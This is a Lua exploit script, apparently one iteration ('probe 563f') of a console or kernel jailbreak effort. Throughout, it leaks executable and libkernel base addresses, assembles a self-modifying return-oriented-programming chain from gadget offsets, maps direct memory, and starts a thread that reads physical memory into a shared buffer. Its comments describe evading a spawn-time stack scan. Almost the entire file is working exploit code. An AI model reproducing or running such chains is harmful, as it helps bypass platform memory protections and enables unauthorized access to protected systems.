-- CRASH_CLASS: MODERATE
-- PROBE 563f: Self-modifying ROP with immediate shared read
--
-- 563e PROVED: self-mod ROP evades spawn-time stack scan.
-- Child executed 7 chain steps (patched chain + MapDM read).
-- Trace fired on ACCESS (RSP = rsp+0x48 = after mov rax, [mapped_va]).
-- But main thread died before polling shared.
--
-- FIX: Read shared IMMEDIATELY after thr_new, no loop.
-- Also: shorter chain (skip sentinel — just write phys data + thr_exit).
-- The child needs ~5 instructions after the MapDM read to write shared.

print("=== PROBE 563f: SELFMOD FAST READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if not ok then return nil end
    local n = N(v); if n < 0 then n = n + 0x100000000 end; return n
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rb(N(ib) + 0x108) or 0; local ehi = rb(N(ib) + 0x10C) or 0
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rb(N(ib) + 0x108) or 0; local lhi = rb(N(ib) + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4

-- ============================================================
-- [A] Pre-build on heap BEFORE MapDM
-- ============================================================
local mapped_va = uint64("0x880000000")

local va_slot = memory.alloc(8)
wq(N(va_slot), mapped_va)

-- 3 shared slots: data[0], sentinel, data[1]
local shared = memory.alloc(0x40)
local sh = N(shared)
wq(sh,       uint64("0xBBBBBBBBBBBBBBBB"))
wq(sh + 8,   uint64("0xAAAAAAAAAAAAAAAA"))
wq(sh + 0x10, uint64("0xCCCCCCCCCCCCCCCC"))

local ss = 0x4000
local stack_buf = memory.alloc(ss)
local sb = N(stack_buf)
local rsp_val = sb + ss - ((sb + ss) % 16) - 8

local off = 0
local function emit(v) wq(rsp_val + off, v); off = off + 8 end

-- Phase 1: load mapped_va from heap, patch chain
emit(g_pop_rsi); emit(uint64(N(va_slot)))
emit(g_mov_rax_m)
-- Patch target is at rsp_val + 56 (same as 563e, verified correct)
local patch_abs = rsp_val + 56
emit(g_pop_rdi); emit(uint64(patch_abs))
emit(g_mov_m_rax)

-- Phase 2: read MapDM via patched value
emit(g_pop_rsi)
emit(Z)  -- PATCH TARGET: overwritten with mapped_va
emit(g_mov_rax_m)  -- rax = *mapped_va = PHYS DATA

-- Phase 3: write result to shared[0]
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- Phase 4: sentinel to shared[8] (keep it, just 3 more entries)
emit(g_pop_rax); emit(uint64("0xDEADFACECAFEBABE"))
emit(g_pop_rdi); emit(uint64(sh + 8))
emit(g_mov_m_rax)

-- Phase 5: read mapped_va+8 → shared[0x10] (bonus second qword)
emit(g_pop_rsi); emit(uint64(N(va_slot)))
-- Need va_slot to hold mapped_va+8 for second read...
-- Actually simpler: use a second va_slot
-- OR: just read from a fixed offset. We can't easily change va_slot
-- mid-chain. Skip second read — keep chain SHORT.

-- Phase 6: thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("chain=%d entries, rsp=0x%X", off / 8, rsp_val))
io.flush()

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

-- ============================================================
-- [B] MapDM
-- ============================================================
pcall(function()
    native.fcall_with_rax(stub, 477,
        mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("mapdm=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [C] Spawn + IMMEDIATE read (no loop!)
-- ============================================================
pcall(function() mk(455)(pa, uint64(0x38)) end)

-- ZERO delay — read shared IMMEDIATELY
-- In 563e, main thread survived to print "thr_new=0" after trace.
-- The 1000-iter busy-wait in first 563f attempt caused the kill to land before print.
-- Child needs ~5 gadgets after MapDM read (~50ns). Main thread pcall overhead is ~1us.
-- Child should be done by the time we get here.
local d_lo = rb(sh) or 0
local d_hi = rb(sh + 4) or 0
local s_lo = rb(sh + 8) or 0
local s_hi = rb(sh + 12) or 0
print(string.format("D=%08X_%08X S=%08X_%08X", d_hi, d_lo, s_hi, s_lo))
io.flush()
print("=== 563f DONE ===")
